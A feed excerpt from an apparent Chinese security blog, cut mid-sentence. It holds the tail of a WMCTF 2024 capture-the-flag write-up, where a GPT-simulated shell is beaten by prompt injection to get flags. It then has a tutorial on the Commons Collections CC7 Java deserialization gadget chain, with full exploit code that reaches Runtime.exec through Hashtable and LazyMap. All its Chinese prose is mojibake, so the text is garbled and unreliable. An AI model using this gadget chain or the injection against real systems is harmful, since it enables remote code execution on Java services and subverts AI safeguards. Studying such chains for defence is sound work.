punctuation">)</span><span class="token punctuation">;</span>    headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"Password"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HttpEntity</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> entity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpEntity</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>restTemplate<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span> <span class="token class-name">HttpMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">,</span> entity<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†…ç½‘æœ‰ä¸ª &#x2F;where_is_my_flagï¼Œflagåœ¨ headers é‡Œé¢</p><p>çœ‹èµ·æ¥è¦æƒ³åŠæ³•è·å–<code>this.restTemplate.exchange(targetUrl, HttpMethod.POST, entity, String.class, new Object[0]);</code>çš„è¯·æ±‚ä½“</p><p>é‚£ä¹ˆå…³æ³¨çš„é‡ç‚¹å°±åœ¨<code>RestTemplate</code>ä¸Š</p><hr><h1 id="give-your-shellï¼ˆmiscï¼‰"><a href="#give-your-shellï¼ˆmiscï¼‰" class="headerlink" title="give your shellï¼ˆmiscï¼‰"></a>give your shellï¼ˆmiscï¼‰</h1><p>ï¼Ÿ</p><p><img src="/blog/2024/09/07/WMCTF2024/image-20240907164909591.png" alt="image-20240907164909591"></p><p>æµ‹è¯•å‘ç°æˆ‘ä»¬æœ€å¤šèƒ½æ‰§è¡Œ5æ¬¡å‘½ä»¤</p><p><img src="/blog/2024/09/07/WMCTF2024/image-20240907184205052.png" alt="image-20240907184205052"></p><p>æ¯æ¬¡è¿”å›çš„ä¸œè¥¿éƒ½ä¸ä¸€æ ·ï¼ŒçŒœæµ‹æ˜¯GPTæ¨¡æ‹Ÿçš„shell</p><p><img src="/blog/2024/09/07/WMCTF2024/image-20240907192747440.png" alt="image-20240907192747440"></p><p>å‘ç°è¿˜åœ¨æ²™ç®±ç¯å¢ƒé‡Œé¢</p><p>é€šè¿‡æç¤ºè¯æ³¨å…¥ï¼Œèƒ½æ‹¿åˆ°flag1ï¼Œä¸è¿‡é¢˜ç›®è®¾ç½®æœ‰é—®é¢˜ï¼Œéšä¾¿å‘½ä»¤è¾“å‡ ä¸‹å°±æŠŠ1å’Œ2å…¨æåˆ°äº†</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿˜å¾—ç»ƒ&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://r3kapig-not1on.notion.site/WMCTF-2024-Writeup-by-r4kapig-57287aa7ffda4cd799339aa3b085393f#6fbbb8e3b6d7418989f7cba3186506e3&quot;&gt;https://r3kapig-not1on.notion.site/WMCTF-2024-Writeup-by-r4kapig-57287aa7ffda4cd799339aa3b085393f#6fbbb8e3b6d7418989f7cba3186506e3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.wm-team.cn/index.php/archives/80/#EzQl&quot;&gt;https://blog.wm-team.cn/index.php/archives/80/#EzQl&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>CC7é“¾</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/06/CC7%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/06/CC7%E9%93%BE/</id>
    <published>2024-09-06T07:28:19.000Z</published>
    <updated>2024-09-07T09:24:44.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>CC7 çš„é“¾å­å’Œ CC5 ç±»ä¼¼ï¼ŒååŠæ¡é“¾å­ä¹Ÿæ˜¯ <code>LazyMap.get()</code> çš„é“¾å­ï¼Œç„¶åä¹Ÿæ¢äº†ä¸ªå…¥å£ç±»</p><p>å‚è€ƒï¼š</p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7</a></p><span id="more"></span><hr><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>å›¾æ¥</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906153352265.png" alt="image-20240906153352265"></p><p><code>equals</code>å¤ªå¤šäº†ï¼Œä¾æ—§æ˜¯æ­£å‘åˆ†æ</p><p>ç›´æ¥çœ‹å…¥å£ç±»<code>Hashtable</code>çš„ readObject</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154206147.png" alt="image-20240906154206147"></p><p>è°ƒç”¨äº†ä¸ª<code>reconstitutionPut()</code>æ–¹æ³•ï¼Œè·Ÿè¿‡å»çœ‹çœ‹</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154323124.png" alt="image-20240906154323124"></p><p>å‘ç°ä¸ªç†Ÿæ‚‰çš„<code>hashCode()</code>ï¼Œä¸è¿‡è¿™æ ·çš„è¯å°±è¿› cc6 äº†ï¼Œæˆ‘ä»¬çš„ç›®æ ‡è¿˜æ˜¯è¿™é‡Œ cc7 çš„ <code>equals</code></p><p>æŸ¥æ‰¾ç”¨æ³•çš„è¯<code>equals</code>å¤ªå¤šäº†ï¼Œç›´æ¥ ctrl+shift+a å…¨å±€æœç´¢æ‰¾<code>AbstractMapDecorator</code>è¿™ä¸ªç±»</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154859596.png" alt="image-20240906154859596"></p><p>ç»§æ‰¿äº† Map æ¥å£ï¼Œå› ä¸ºå®ƒæ˜¯ CC åŒ…é‡Œé¢çš„ Map ç±»ï¼Œå¹¶ä¸”èƒ½å¤Ÿè°ƒç”¨çˆ¶ç±» Mapï¼Œæ‰€ä»¥æŠŠå®ƒä½œä¸ºé“¾å­çš„ä¸€éƒ¨åˆ†</p><p>ä½†æ˜¯ Map æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å»æ‰¾ Map çš„å®ç°ç±»</p><p>æœ€ç»ˆåœ¨ <code>AbstractMap</code> ç±»ä¸­çš„ <code>equals()</code> æ–¹æ³•ä¸­å‘ç°å…¶è°ƒç”¨äº† <code>get()</code> æ–¹æ³•</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906155944043.png" alt="image-20240906155944043"></p><p>é‚£ä¹ˆåªéœ€è¦è®© m å¯æ§ä¸º LazyMap å³å¯è¿ä¸Šé“¾å­</p><hr><h1 id="å†™exp"><a href="#å†™exp" class="headerlink" title="å†™exp"></a>å†™exp</h1><p>LazyMap.get çš„éƒ¨åˆ†ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œè¿™é‡Œä¸æäº†</p><p>è€Œä¸Šé¢çš„é“¾å­è¿èµ·æ¥å°±æ˜¯ï¼š<code>Hashtable.readObject</code> -&gt; <code>Hashtable.reconstitutionPut</code> -&gt; <code>Abstracecorator.equals</code> -&gt; <code>AbstractMap.equals</code></p><p>çœ‹èµ·æ¥å¥½åƒæ˜¯å››ä¸ªæ­¥éª¤ï¼Œä½†æ˜¯å…¶å®<code>AbstractMapequals</code>è¿™é‡Œï¼Œé¦–å…ˆæ˜¯è°ƒç”¨<code>LazyMap.equals</code>ï¼Œä½†æ˜¯ LazyMap æ²¡è¿™ä¸ªæ–¹æ³•æ‰æ‰¾çˆ¶ç±»æ‰¾åˆ°äº†<code>AbstractMap.equals</code></p><p>æ¥ä¸‹æ¥åˆ†ææ¯æ®µæ–¹æ³•çš„å‚æ•°</p><p>é¦–å…ˆæ˜¯ readObjectï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Read the number of elements and then all the key/value objects</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> elements <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> elements<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token class-name">K</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">K</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token class-name">V</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">V</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// synch could be eliminated for performance</span>    <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>reconstitutionPut</code>æ˜¯åœ¨ä¸€ä¸ªforå¾ªç¯é‡Œé¢çš„</p><p>ç„¶åæ˜¯ reconstitutionputï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab<span class="token punctuation">,</span> <span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">StreamCorruptedException</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Makes sure the key is not already in the hashtable.</span>      <span class="token comment">// This should not happen in deserialized version.</span>      <span class="token keyword">int</span> hash <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>hash <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token comment">// ...</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code></p><p>åˆ°è¿™é‡Œå°±è¦çœ‹ä¸€ä¸‹ key æ˜¯å•¥äº†ï¼Œæº¯æºå‘ç°åœ¨ writeObject æ–¹æ³•é‡Œ</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906161127119.png" alt="image-20240906161127119"></p><p>å…¶å® key å°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡ put è¿›å»çš„ keyï¼Œé‚£ä¹ˆå†™æ³•å°±æ˜¯ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>äºæ˜¯å†™expï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc7</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿è¡Œï¼Œæ— äº‹å‘ç”Ÿã€‚ã€‚</p><p>ä¸‹æ–­ç‚¹å‘ç°æ ¹æœ¬æ²¡è¿›<code>AbstractMap.equals()</code>ï¼Œçœ‹çœ‹ ysoserial æ˜¯æ€ä¹ˆåšçš„</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906162401912.png" alt="image-20240906162401912"></p><p>ysoserial è¿™é‡Œçš„é“¾å­å¤šäº†ä¸€ä¸ª mapï¼Œè¿˜æŠŠä¸¤ä¸ª map è¿›è¡Œäº†æ¯”è¾ƒ</p><h2 id="è°ƒç”¨ä¸¤æ¬¡-put"><a href="#è°ƒç”¨ä¸¤æ¬¡-put" class="headerlink" title="è°ƒç”¨ä¸¤æ¬¡ put"></a>è°ƒç”¨ä¸¤æ¬¡ put</h2><p>æˆ‘ä»¬éœ€è¦è°ƒç”¨çš„ <code>e.key.equals()</code> æ–¹æ³•æ˜¯åœ¨ for å¾ªç¯é‡Œé¢çš„ï¼Œéœ€è¦è¿›å…¥åˆ°è¿™ä¸ª for å¾ªç¯æ‰èƒ½è°ƒç”¨</p><p><code>Hashtable</code> çš„ <code>reconstitutionPut()</code> æ–¹æ³•æ˜¯è¢«éå†è°ƒç”¨çš„</p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šèµ°å…¥åˆ° <code>reconstitutionPut()</code> æ–¹æ³• for å¾ªç¯é‡Œé¢ï¼Œå› ä¸º <code>tab[index]</code> çš„å†…å®¹æ˜¯ç©ºçš„</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906163306716.png" alt="image-20240906163306716"></p><p>åœ¨ä¸‹é¢æ‰ä¼šå¯¹ <code>tab[index]</code> è¿›è¡Œèµ‹å€¼</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906163415877.png" alt="image-20240906163415877"></p><p>æ‰€ä»¥éœ€è¦ä¸¤æ¬¡putèµ‹å€¼æ‰èƒ½è¿›å…¥</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ï¼ˆè¿™é‡Œæ˜¯æ ˆç»“æ„ï¼Œæ‰€ä»¥æœ€åputè¿›å»çš„ä¼šæˆä¸ºç¬¬ä¸€ä¸ª<code>tab[index]</code>ï¼‰</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906165008258.png" alt="image-20240906165008258"></p><p>ç„¶è€Œè¿™æ ·å­ä¾æ—§ä¸èƒ½è¿›ï¼Œè°ƒè¯•äº†åŠå¤©å‘ç°é—®é¢˜å‡ºåœ¨äº†hashä¸Šé¢</p><h2 id="æŒ‡å®škeyçš„å€¼"><a 